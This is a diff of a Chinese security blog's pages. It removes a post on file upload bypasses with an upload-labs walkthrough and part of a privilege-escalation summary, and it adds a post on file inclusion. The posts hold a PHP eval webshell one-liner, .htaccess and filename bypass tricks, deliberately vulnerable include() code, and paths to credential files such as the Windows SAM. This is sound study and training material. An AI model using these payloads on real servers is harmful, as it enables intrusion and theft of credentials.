@@ -2400,255 +2400,6 @@ msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi/" itemprop="url">“文件上传漏洞学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:49:18+08:00">
-                2020-04-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="文件上传-文件包含漏洞学习笔记-靶场实战"><a href="#文件上传-文件包含漏洞学习笔记-靶场实战" class="headerlink" title="文件上传+文件包含漏洞学习笔记+靶场实战"></a>文件上传+文件包含漏洞学习笔记+靶场实战</h1><p>[TOC]</p>
-<h2 id="文件上传漏洞部分"><a href="#文件上传漏洞部分" class="headerlink" title="文件上传漏洞部分"></a>文件上传漏洞部分</h2><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p><strong>一.什么是文件上传漏洞</strong></p>
-<p> 文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p>
-<p><strong>二.文件上传漏洞危害</strong></p>
-<ul>
-<li>网站被控制，对文件增删改查，执行命令，链接数据库</li>
-<li>如果服务器长久未更新，可以利用exp提权，导致服务器沦陷</li>
-<li>同服务器的其他网站沦陷。</li>
-</ul>
-<p><strong>二.文件上传漏洞的主要利用和绕过方式总结。</strong></p>
-<p><strong>1.前端JS绕过</strong></p>
-<p>基于本地验证文件是否符合要求：直接将<strong>JavaScript</strong>禁用。或者burp抓包后修改后缀，将php文件后缀现先改为jpg，burp抓包后后缀改回php。</p>
-<p><strong>2.MIME 类型验证</strong></p>
-<p>burp抓包将<strong>Content-type</strong>类型修改为image/jpeg，image/png等</p>
-<p><strong>3.黑名单验证</strong></p>
-<p>1.寻找没有过滤的类型：phtml php3 php4 php5  PHP phtml</p>
-<p>2.大小写绕过：例如Php</p>
-<p><strong>4.文件内容验证</strong></p>
-<p>1<strong>.getimagesize()函数获取图像信息</strong>：通过构造图片马进行绕过。</p>
-<p>2.<strong>文件头绕过</strong>：例如 GIF89a <?php phpinfo(); ?></p>
-<p>2.<strong>检验关键字</strong>&lt;?php:利用script标签绕过：<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;hack&#39;]);&lt;/script&gt;</code></p>
-<p><strong>6. .htaccess上传</strong></p>
-<p>上传的.jpg文件都会以php格式解析</p>
-<p>.htaccess内容</p>
-<pre><code>AddType   application/x-httpd-php     .jpg</code></pre><p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过</p>
-<p><strong>7.00截断绕过</strong></p>
-<p>php.   jpg  将空格二进制20改为00；</p>
-<p><strong>8.win系统解析漏洞绕过</strong></p>
-<p>1.上传1.php(或者图片马)，抓包修改为1.php.</p>
-<p>2.上传1.php(或者图片马)，抓包修改为1.php::$DATA</p>
-<p>3.上传1.php(或者图片马)，抓包修改为1.php:1.jpg</p>
-<p>4.上传1.php(或者图片马)，抓包修改为1.php::$DATA…….</p>
-<p><strong>9.文件包含绕过</strong>：首先上传图片木马shell.jpg，然后上传可以进行文件包含的php文件,比如上传1.php</p>
-<pre class=" language-php"><code class="language-php"><span class="token variable">$x</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p>然后我们访问1.php?x=shell.jpg即可。</p>
-<p><strong>10.条件竞争绕过</strong></p>
-<p>通过BURP不断发包，导致不断写入webshell,再写入速度频率上超过安全软件查杀频率，导致绕过。</p>
-<p><strong>11.二次渲染绕过</strong></p>
-<p>上传图片加载后，会对图片进行二次渲养，改变大部分图片源码，绕过为：对照上传后的图片与原图片放在winhex中对不，查看图片哪个数据块没有被改变。将木马代码放在没有改变的一块中，在不损坏图片的前提下，即可绕过上传</p>
-<p><strong>12.中间件解析漏洞</strong></p>
-<p>apache：上传图片马，抓包修改为1.php.xxxx.abc</p>
-<p>iis6.0 6.5：上传图片马，抓包修改猴嘴为.asa、.cer和.cdx等。</p>
-<p>​                    上传图片马，抓包修改为1.asp;.jpg或者%00 /00也可以</p>
-<p>​                    上传图片马，抓包发现有保存图片的路径，如../upload/image</p>
-<p>nginx: 上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析,如         </p>
-<p>​            upload/image/1.jpg/.php</p>
-<p>tomcat:弱口令进入后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p>
-<h4 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h4><p><strong>upolad-labs考察知识点汇总：</strong></p>
-<img src="11525934-e19630249b9b8764.png"  />
-
-
-
-<p>​    upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
-<h5 id="Pass-01-前端js检测"><a href="#Pass-01-前端js检测" class="headerlink" title="Pass-01-前端js检测"></a>Pass-01-前端js检测</h5><p><strong>考察知识点：</strong>前端js检测，我们可以选择禁用js,或者直接burp直接抓包绕过.。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200115201219.png" alt=""></p>
-<h5 id="Pass-02-只检测Content-type"><a href="#Pass-02-只检测Content-type" class="headerlink" title="Pass-02 只检测Content-type"></a>Pass-02 只检测Content-type</h5><p><strong>考察知识点：</strong>Content-Type绕过，我们直接改为 image/jpeg</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200115201548.png" alt=""></p>
-<h5 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h5><p><strong>考察知识点：</strong>黑名单绕过，禁止上传.asp|.aspx|.php|.jsp后缀文件，但是我们可以上传.php3 .phtml .php5另类后缀名。</p>
-<h5 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04  .htaccess绕过"></a>Pass-04  .htaccess绕过</h5><p><strong>考察知识点：</strong>构造.htaccess文件，内容为<code>AddType  application/x-httpd-php  .jpg</code></p>
-<p>我们首先上传.htaccess文件，</p>
-<img src="QQ截图20200124121848.png" style="zoom: 80%;" />
-
-
-
-<p>然后上传我们事先准备好的php文件将后缀改为.jpg文件,</p>
-<img src="QQ截图20200124122245.png" style="zoom:150%;" />
-
-<p>可以在本地看到成功上传。</p>
-<h5 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h5><p><strong>考察知识点：</strong>因为此次黑名单过滤了.htaccess，但是没有将文件名转换为小写。所以我们可以通过大小写绕过。</p>
-<img src="QQ截图20200124124135.png" style="zoom: 80%;" />
-
-
-
-<h5 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h5><p><strong>考察知识点</strong>：修改文件后缀为<code>1.php空格</code>.,利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格,达到上传.php的目的</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200124124135.png" alt=""></p>
-<h5 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h5><p><strong>考察知识点：</strong>wIndow命名规则:window下 xx.php空格xx.php.不允许存在，系统会默认去除空格或点。此处过滤了空格，但是没有过滤点。我们用burp将文件后缀改为php.即可。</p>
-<img src="QQ截图20200124130943.png" style="zoom:150%;" />
-
-
-
-<h5 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08  ::$DATA绕过"></a>Pass-08  ::$DATA绕过</h5><p><strong>考察知识点</strong>：$DATA绕过：在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
-<p>所以：文件后缀改为：<code>xx.php::$DATA</code>即可</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200115202909.png" alt=""></p>
-<h5 id="Pass-09-点空格点绕过"><a href="#Pass-09-点空格点绕过" class="headerlink" title="Pass-09 点空格点绕过"></a>Pass-09 点空格点绕过</h5><p>这里我们分析一下源代码：</p>
-<pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
-<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>
-        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>
-        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>
-        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>
-
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span></code></pre>
-<p>这里其实已经过滤的很严格了。</p>
-<p>依次进行了严格的黑名单过滤、转换大小写、去除文件名尾的空格和点。还去除了;$DATA.</p>
-<p>但是这里存在很明显的代码逻辑漏洞：代码<strong>去点，除空</strong>的操作只进行了一次。那么我们把后缀名改为</p>
-<p><strong>php. .</strong> 点 空格点的格式。最后的后缀名为<strong>.php.</strong> 成功绕过。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200115204443.png" alt=""></p>
-<h5 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h5><p>考察知识点:双写绕过，这里利用了<code>str_irepalce</code>函数将不符合上传的后缀名替换为空，且该函数对 大小写不敏感，我们可以通过双写后缀名 .pphphp进行绕过。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200115205208.png" alt=""></p>
-<h5 id="Pass-11-get-00截断"><a href="#Pass-11-get-00截断" class="headerlink" title="Pass-11 get 00截断"></a>Pass-11 get 00截断</h5><p>考察知识点：00截断</p>
-<img src="QQ截图20200124131542.png" style="zoom:50%;" />
-
-<p><strong>Pass-12 Post 00截断</strong></p>
-<p>考察知识点：00截断</p>
-<p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200128202954.png" alt=""></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200128203026.png" alt=""></p>
-<h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>考察知识点：图片马，结合文件包含</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200115211730.png" alt=""></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200115211949.png" alt=""></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
                 <a class="post-title-link" href="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi/" itemprop="url">文件上传漏洞学习</a></h1>
         
 
@@ -3923,7 +3674,7 @@ window<span class="token punctuation">.</span>onload <span class="token operator
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/ti-quan-fang-shi-zong-jie/">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Shu1L">
@@ -3942,7 +3693,7 @@ window<span class="token punctuation">.</span>onload <span class="token operator
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/04/03/ti-quan-fang-shi-zong-jie/" itemprop="url">提权方式总结</a></h1>
+                <a class="post-title-link" href="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/" itemprop="url">文件包含漏洞学习笔记</a></h1>
         
 
         <div class="post-meta">
@@ -3954,7 +3705,7 @@ window<span class="token punctuation">.</span>onload <span class="token operator
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T13:30:39+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T12:42:02+08:00">
                 2020-04-03
               </time>
             
@@ -3964,6 +3715,28 @@ window<span class="token punctuation">.</span>onload <span class="token operator
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">web漏洞学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -3994,321 +3767,470 @@ window<span class="token punctuation">.</span>onload <span class="token operator
       
         
           
-            <h2 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a>提权方式总结</h2><h4 id="1-什么是提权"><a href="#1-什么是提权" class="headerlink" title="1.什么是提权"></a>1.什么是提权</h4><p>提权就是通过各种办法和漏洞，提高自己在服务器中的权限，以便控制全局。</p>
-<p>Windows：User &gt;&gt; System<br>Linux：User &gt;&gt; Root</p>
-<h4 id="2-提权的方式"><a href="#2-提权的方式" class="headerlink" title="2.提权的方式"></a>2.提权的方式</h4><p>1.、系统漏洞提权（Linux、Windows）</p>
-<p>2、数据库提权</p>
-<p>3、系统配置错误提权</p>
-<p>4、权限继承类提权</p>
-<p>5、第三方软件/服务提权</p>
-<p>6、WebServer漏洞提权</p>
-<h4 id="1-系统漏洞提权"><a href="#1-系统漏洞提权" class="headerlink" title="1.系统漏洞提权"></a>1.系统漏洞提权</h4><p>系统漏洞提权一般就是利用系统自身缺陷，用来提升权限。为了使用方便，windows和linux系统均有提权用的可执行文件。</p>
-<p>Windows的提权exp一般格式为MS08067.exe；<br>Linux的提权exp一般格式为2.6.18-194或2.6.18.c。</p>
-<h5 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h5><ul>
-<li>漏洞编号命名格式</li>
+            <h2 id="文件包含漏洞学习"><a href="#文件包含漏洞学习" class="headerlink" title="文件包含漏洞学习"></a>文件包含漏洞学习</h2><h4 id="文件包含漏洞相关知识点"><a href="#文件包含漏洞相关知识点" class="headerlink" title="文件包含漏洞相关知识点"></a>文件包含漏洞相关知识点</h4><h5 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h5><p>​       服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
+<h5 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h5><ul>
+<li>require()</li>
+<li>require_once()</li>
+<li>include()</li>
+<li>include_once()</li>
 </ul>
-<p>Windows系统漏洞编号命名格式为：MS08067</p>
-<p>其中：MS是Micosoft的缩写，固定格式；08 表示年份，即2008年发布的漏洞；067 表示顺序，即当年度发布的第67个漏洞。</p>
+<p><strong><code>include</code>和<code>require</code>区别</strong>:<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
+<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
+<p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-7889a572371b18c8.png" alt=""></p>
+<h5 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h5><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致执行了非预期的代码。</p>
+<p>示例代码：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+       <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+       <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p>
+<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>文件包含分为：本地(LFI)/远程(RFI)包含</p>
+<p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
+<p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br> 但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
+<pre class=" language-undefined"><code class="language-undefined">allow_url_fopen = On
+allow_url_include = On，重启apache，即可生效</code></pre>
+<p>两个配置选项均需要为On，才能远程包含文件成功。<br> 另外一台需要开启apache</p>
+<pre class=" language-kotlin"><code class="language-kotlin">apt<span class="token operator">-</span><span class="token keyword">get</span> install apache2
+ <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token keyword">init</span><span class="token punctuation">.</span>d<span class="token operator">/</span>apache2 start</code></pre>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-952116d80dc7f768.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
+<p>1.png</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-e288840e08e52b5e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/376" alt="img"></p>
+<p>2.png<br> 注：在php.ini中，allow_url_fopen默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。<br> 下面例子中测试代码均为：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>allow_url_fopen 默认为 On<br> allow_url_include 默认为 Off<br> 若有特殊要求，会在利用条件里指出。</p>
+<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><h5 id="一、无限制本地文件包含漏洞"><a href="#一、无限制本地文件包含漏洞" class="headerlink" title="一、无限制本地文件包含漏洞"></a>一、无限制本地文件包含漏洞</h5><p><strong>测试代码：</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><strong>常见的敏感信息目录：</strong></p>
+<p>window系统：</p>
 <ul>
-<li>使用exp提权</li>
+<li>c:\boot.ini //查看系统版本</li>
+<li>c:\windows\system32\inetsrv\MetaBase.xml //IIS配置</li>
+<li>c:\windows\repair\sam  // 存储Windows系统初次安装的密码</li>
+<li>c:\ProgramFiles\mysql\my.ini // MySQL配置</li>
+<li>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</li>
+<li>c:\windows\php.ini // php 配置信息</li>
 </ul>
-<p>在日常渗透测试过程中，我们常常会先是拿到webshell再进行提权。所以提权脚本也常常会被在webshell中运行使用。</p>
-<p>那么我们如何知道使用哪个exp来提权呢？</p>
-<p>我们可以使用systeminfo命令或者查看补丁目录，查看补丁记录，来判断有哪个补丁没打，然后使用相对应的exp进行提权。</p>
-<p><strong>TIPS：</strong></p>
-<p>1.渗透过程中经常会遇到管理员禁止了cmd.exe的使用，我们该怎么办？进止了exe文件的上传怎么办？<br> 2.管理员禁止了一些脚本函数的运行，看不到回显怎么办？<br> 3.在使用webshell提权的时候要特别注意：<br> asp的webshell要支持：<br> wscript(wscript.shell/shell.application)<br> aspx能调用.net组件来执行cmd的命令<br> /c whoami</p>
-<h5 id="linux系统提权"><a href="#linux系统提权" class="headerlink" title="linux系统提权"></a>linux系统提权</h5><p>Linux系统漏洞的exp一般按照内核版本来命名：2.6.18-194或2.6.18.c</p>
